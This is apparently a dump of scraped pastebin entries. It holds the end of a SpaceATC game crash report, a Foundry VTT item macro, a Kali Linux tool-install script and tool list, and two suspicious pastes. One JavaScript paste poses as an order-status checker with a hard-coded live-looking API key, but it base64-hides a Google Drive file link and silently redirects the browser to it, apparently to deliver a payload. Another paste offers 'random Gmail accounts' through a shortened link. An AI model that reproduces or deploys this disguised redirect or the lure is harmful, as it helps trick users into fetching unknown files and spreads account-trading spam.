			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15fe74 ntdll 0x00007ffc3d760000 + daaa4 KERNELBASE 0x00007ffc3ac50000 + 6a911 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2dac SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 2a59f67 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>34300</ThreadID>
				<ThreadName>RTHeartBeat 0</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + fb0d6e SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>13056</ThreadID>
				<ThreadName>PSOPrecompilePool #0</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + fb0d6e SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>37012</ThreadID>
				<ThreadName>PSOPrecompilePool #1</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + fb0d6e SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>37484</ThreadID>
				<ThreadName>PSOPrecompilePool #2</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + fb0d6e SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>13568</ThreadID>
				<ThreadName>PSOPrecompilePool #3</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + fb0d6e SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>35200</ThreadID>
				<ThreadName>PSOPrecompilePool #4</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + fb0d6e SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>11972</ThreadID>
				<ThreadName>PSOPrecompilePool #5</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + fb0d6e SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>34612</ThreadID>
				<ThreadName>PSOPrecompilePool #6</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + fb0d6e SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>11652</ThreadID>
				<ThreadName>PSOPrecompilePool #7</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + fb0d6e SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>34452</ThreadID>
				<ThreadName>PSOPrecompilePool #8</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + fb0d6e SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>36848</ThreadID>
				<ThreadName>PSOPrecompilePool #9</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + fb0d6e SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>35636</ThreadID>
				<ThreadName>PSOPrecompilePool #10</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + fb0d6e SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>37892</ThreadID>
				<ThreadName>PSOPrecompilePool #11</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + fb0d6e SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>35552</ThreadID>
				<ThreadName>PSOPrecompilePool #12</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + fb0d6e SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>34464</ThreadID>
				<ThreadName>PSOPrecompilePool #13</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + fb0d6e SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>30956</ThreadID>
				<ThreadName>PSOPrecompilePool #14</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + fb0d6e SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>38056</ThreadID>
				<ThreadName>PSOPrecompilePool #15</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + fb0d6e SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>29468</ThreadID>
				<ThreadName>PSOPrecompilePool #16</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + fb0d6e SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>34988</ThreadID>
				<ThreadName>PSOPrecompilePool #17</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + fb0d6e SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>3524</ThreadID>
				<ThreadName>PSOPrecompilePool #18</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + fb0d6e SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>35592</ThreadID>
				<ThreadName>PSOPrecompilePool #19</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + fb0d6e SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>35644</ThreadID>
				<ThreadName>PSOPrecompilePool #20</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + fb0d6e SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>37476</ThreadID>
				<ThreadName>PSOPrecompilePool #21</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + fb0d6e SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>9180</ThreadID>
				<ThreadName>PSOPrecompilePool #22</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + fb0d6e SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>34784</ThreadID>
				<ThreadName>PSOPrecompilePool #23</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 11ac4f1 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 11ac3ce SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 118d395 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>32104</ThreadID>
				<ThreadName>FAsyncLoadingThread</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15fe74 ntdll 0x00007ffc3d760000 + daaa4 KERNELBASE 0x00007ffc3ac50000 + 6a911 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2dac SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 3c3ab01 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>21596</ThreadID>
				<ThreadName>ScreenSaverInhibitor</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 1e5f517 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>22768</ThreadID>
				<ThreadName>AudioMixerNullCallbackThread</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 15f874 KERNELBASE 0x00007ffc3ac50000 + 4ce4f SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e41a6 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 1e5f737 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 1e5f66e SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>34868</ThreadID>
				<ThreadName>AudioMixerRenderThread(1)</ThreadName>
			</Thread>
			<Thread>
				<CallStack>ntdll 0x00007ffc3d760000 + 163444 ntdll 0x00007ffc3d760000 + f5f5 ntdll 0x00007ffc3d760000 + 1a6df ntdll 0x00007ffc3d760000 + 19e38 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 120f5ce SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e2957 SpaceATC-Win64-Shipping 0x00007ff6cf970000 + 10e0241 KERNEL32 0x00007ffc3c030000 + 2e8d7</CallStack>
				<IsCrashed>false</IsCrashed>
				<Registers />
				<ThreadID>3212</ThreadID>
				<ThreadName>FAsyncPurge</ThreadName>
			</Thread>
		</Threads>
		<TimeOfCrash>638789746611200000</TimeOfCrash>
		<bAllowToBeContacted>1</bAllowToBeContacted>
		<CPUBrand>Intel(R) Core(TM) i9-14900KF</CPUBrand>
		<CrashReportClientVersion>1.0</CrashReportClientVersion>
		<Modules>C:\Program Files (x86)\Steam\steamapps\common\Delos\SpaceATC\Binaries\Win64\SpaceATC-Win64-Shipping.exe
C:\Program Files (x86)\Steam\steamapps\common\Delos\SpaceATC\Plugins\DiscordPartnerSDK\Binaries\ThirdParty\DiscordPartnerSDKLibrary\Win64\discord_partner_sdk.dll
C:\Program Files (x86)\Steam\steamapps\common\Delos\Engine\Binaries\ThirdParty\Vorbis\Win64\VS2015\libvorbis_64.dll
C:\Program Files (x86)\Steam\steamapps\common\Delos\Engine\Binaries\ThirdParty\NVIDIA\NVaftermath\Win64\GFSDK_Aftermath_Lib.x64.dll
C:\Program Files (x86)\Steam\steamapps\common\Delos\Engine\Binaries\ThirdParty\DbgHelp\dbghelp.dll
C:\Program Files (x86)\Steam\steamapps\common\Delos\Engine\Binaries\ThirdParty\Windows\XAudio2_9\x64\xaudio2_9redist.dll
C:\Program Files (x86)\Steam\steamapps\common\Delos\Engine\Binaries\ThirdParty\Steamworks\Steamv157\Win64\steam_api64.dll
C:\Program Files (x86)\Steam\steamapps\common\Delos\Engine\Binaries\ThirdParty\Ogg\Win64\VS2015\libogg_64.dll
C:\Program Files (x86)\Steam\steamapps\common\Delos\Engine\Binaries\ThirdParty\Vorbis\Win64\VS2015\libvorbisfile_64.dll</Modules>
	</RuntimeProperties>
	<PlatformProperties>
		<PlatformIsRunningWindows>1</PlatformIsRunningWindows>
		<IsRunningOnBattery>false</IsRunningOnBattery>
		<DriveStats.Project.Name>C:/Program Files (x86)/Steam/steamapps/common/Delos/SpaceATC/Binaries/Win64/</DriveStats.Project.Name>
		<DriveStats.Project.Type>NVMe</DriveStats.Project.Type>
		<DriveStats.Project.FreeSpaceKb>1174203160</DriveStats.Project.FreeSpaceKb>
		<DriveStats.PersistentDownload.Name>C:/Users/daven/AppData/Local/SpaceATC/Saved/PersistentDownloadDir</DriveStats.PersistentDownload.Name>
		<DriveStats.PersistentDownload.Type>NVMe</DriveStats.PersistentDownload.Type>
		<DriveStats.PersistentDownload.FreeSpaceKb>1174203160</DriveStats.PersistentDownload.FreeSpaceKb>
		<PlatformCallbackResult>0</PlatformCallbackResult>
		<CrashTrigger>0</CrashTrigger>
	</PlatformProperties>
	<EngineData>
		<MatchingDPStatus>WindowsNo errors</MatchingDPStatus>
		<RHI.IntegratedGPU>false</RHI.IntegratedGPU>
		<RHI.DriverDenylisted>false</RHI.DriverDenylisted>
		<RHI.D3DDebug>false</RHI.D3DDebug>
		<RHI.Breadcrumbs>false</RHI.Breadcrumbs>
		<RHI.DRED>false</RHI.DRED>
		<RHI.DREDMarkersOnly>true</RHI.DREDMarkersOnly>
		<RHI.DREDContext>false</RHI.DREDContext>
		<RHI.Aftermath>false</RHI.Aftermath>
		<RHI.RHIName>D3D12</RHI.RHIName>
		<RHI.AdapterName>NVIDIA GeForce RTX 4080 SUPER</RHI.AdapterName>
		<RHI.UserDriverVersion>572.70</RHI.UserDriverVersion>
		<RHI.InternalDriverVersion>32.0.15.7270</RHI.InternalDriverVersion>
		<RHI.DriverDate>3-3-2025</RHI.DriverDate>
		<RHI.FeatureLevel>SM6</RHI.FeatureLevel>
		<RHI.GPUVendor>NVIDIA</RHI.GPUVendor>
		<RHI.DeviceId>2702</RHI.DeviceId>
		<DeviceProfile.Name>Windows</DeviceProfile.Name>
		<Platform.AppHasFocus>true</Platform.AppHasFocus>
	</EngineData>
	<GameData />
</FGenericCrashContext>
"
MG6qkpVG,Untitled,navrajkhunger,JavaScript,Sunday 30th of March 2025 06:41:44 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/064/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
hSxkf978,FVTT-CYPHER Macro to Import Artifact Item,ineedanewgame,JavaScript,Sunday 30th of March 2025 06:33:26 PM CDT,"// Function to create the artifact item
async function createArtifactItem(name, description, level, folderId) {
    let itemData = {
        name: name, // Use the name from the dialog
        type: ""artifact"", // Set the type to ""cypher""
        system: {
            description: `<p>${description}</p>`, // Directly assign the description wrapped in <p> tags
            level: level
        },
        folder: folderId,
    };

    Item.create(itemData).then(item => {
        ui.notifications.info(`Created item: ${item.name}`);
    }).catch(err => {
        console.error(err);
        ui.notifications.error(`Could not create item: ${err.message}`);
    });
}

new Dialog({
    title: ""New Artifact"",
    content: `
        <form>
            <div class=""form-group"">
                <label>Artifact Name:</label>
                <input type=""text"" name=""name"" />
            </div>
            <div class=""form-group"">
                <label>Artifact Description:</label>
                <textarea name=""description"" rows=""5""></textarea>
            </div>
            <div class=""form-group"">
                <label>Level:</label>
                <textarea name=""level"" rows=""1""></textarea>
            </div>
        </form>
    `,
    buttons: {
        create: {
            label: ""Create Artifact"",
            callback: html => {
                let name = html.find(""[name='name']"").val();
                let description = html.find(""[name='description']"").val();
                let level = html.find(""[name='level']"").val();
                const folderId = 'Usrhaxw1OYfd0nUM'; // Use the folder id
                // Create the artifact item with the provided name, description, and level
                createArtifactItem(name, description, level, folderId);
            }
        },
        cancel: {
            label: ""Cancel""
        }
    },
    default: ""create""
}).render(true);"
2XbnMdKR,Random Gmail Acc 1A,PuyiieAcademy21,JavaScript,Sunday 30th of March 2025 06:31:07 PM CDT," 
Pdf https://tinyurl.com/methodssss


OVOG60n3jx
"
8VuMzu5e,install_kali_tools,dennis6400,Bash,Sunday 30th of March 2025 06:27:29 PM CDT,"#!/bin/bash

##
# Prepare installation
##

set -e

# Architecture
ARCH=$(dpkg --print-architecture)
echo ""Detected architecture: ${ARCH}""

# Sublime Text
INSTALL_SUBL=""yes""
SUBL_VERS=""4192""

# Google Chrome
INSTALL_CHROME=""yes""

# Burp Professional
INSTALL_BURP=""yes""
BURP_VERS=""2025.2.2""

# Upgrading existing apt packages
#UPGRADE=""yes""


##
# Update existing apt packages
##

echo ""[+] Updating system...""
sudo apt update
if [ ""${UPGRADE}"" == ""yes"" ]; then
	sudo apt upgrade -y
else
	echo ""Skipping""
fi


##
# Install apt packages
##

echo ""[+] Installing basic tools...""
sudo apt install -y \
  curl wget tree htop exiftool openvpn docker.io docker-compose \
  keepassx flameshot terminator git make gcc jq xclip p7zip-full

echo ""[+] Installing web hacking tools...""
sudo apt install -y \
  dirb gobuster feroxbuster ffuf testssl.sh aha

echo ""[+] Installing privilege escalation tools...""
sudo apt install -y \
  windows-privesc-check unix-privesc-check

echo ""[+] Installing miscellaneous tools...""
sudo apt install -y \
  libreoffice libsecret-1-0 libsecret-1-dev chromium filezilla x11-xkb-utils

echo ""[+] Installing SecLists and PayloadsAllTheThings...""
sudo apt install -y seclists payloadsallthethings


##
# Clone git repositories
##

echo ""[+] Cloning Git repositories into ${TOOLS_DIR}/...""
TOOLS_DIR=""${HOME}/tools""
mkdir -p ${TOOLS_DIR}
cd ${TOOLS_DIR}

git clone https://github.com/swisskyrepo/InternalAllTheThings.git
git clone https://github.com/fuzzdb-project/fuzzdb.git
git clone https://github.com/HackTricks-wiki/hacktricks.git


##
# Install additional software: Sublime Text
##

if [ ""${INSTALL_SUBL}"" == ""yes"" ]; then
	echo ""[+] Downloading Sublime Text...""
	cd ${TOOLS_DIR}
	wget -O sublime-text.deb ""https://download.sublimetext.com/sublime-text_build-${SUBL_VERS}_${ARCH}.deb""
	sudo apt install -y ./sublime-text.deb
	rm sublime-text.deb
fi


##
# Install additional software: Google Chrome
##

if [ ""${INSTALL_CHROME}"" == ""yes"" ]; then
	if [ ""$ARCH"" != ""arm64"" ]; then
		echo ""[+] Downloading Google Chrome...""
		cd ${TOOLS_DIR}
		wget -O google-chrome.deb ""https://dl.google.com/linux/direct/google-chrome-stable_current_${ARCH}.deb""
		sudo apt install -y ./google-chrome.deb
		rm google-chrome.deb
	else
		echo ""Skipping Google Chrome (not supported on arm64)""	
	fi
fi


##
# Install additional software: Burp Suite Professional
##

if [ ""${INSTALL_BURP}"" == ""yes"" ]; then
	echo ""[+] Downloading Burp Suite Pro (manual license activation required)...""
	mkdir -p ${TOOLS_DIR}/burp
	cd ${TOOLS_DIR}/burp
	if [ ""$ARCH"" != ""arm64"" ]; then
		BURP_URL=""https://portswigger-cdn.net/burp/releases/download?product=pro&version=${BURP_VERS}&type=LinuxArm64""
	else
		BURP_URL=""https://portswigger-cdn.net/burp/releases/download?product=pro&version=${BURP_VERS}&type=Linux""
	fi
	wget ""${BURP_URL}"" -O burpsuite.sh
	chmod +x burpsuite.sh
	echo ""[!] Start Burp Suite installer manually: ${TOOLS_DIR}/burp/burpsuite.sh""
fi


## 
# Complete installation
##

echo ""[✓] Installation complete!"""
KqVbKjL2,kali_tools,dennis6400,Bash,Sunday 30th of March 2025 06:24:03 PM CDT,"##
# Basic Tools (via apt)
##

- curl 
- wget
- tree
- htop
- exiftool
- openvpn
- docker.io
- docker-compose
- keepassx
- flameshot
- terminator
- git
- make
- gcc
- jq
- xclip
- 7zip


##
#  Web Hacking Tools (via apt)
##

- dirb
- gobuster
- feroxbuster
- ffuf
- testssl.sh
- aha


##
# Privilege Escalation (via apt)
##

- windows-privesc-check 
- unix-privesc-check


##
# Misc (via apt)
##

- libreoffice
- libsecret-1-0 
- libsecret-1-dev
- chromium
- filezilla
- x11-xkb-utils


##
# SecLists (via apt) 
##

- seclists
- payloadsallthethings


##
# Git Repositories
##

InternalAllTheThing: 
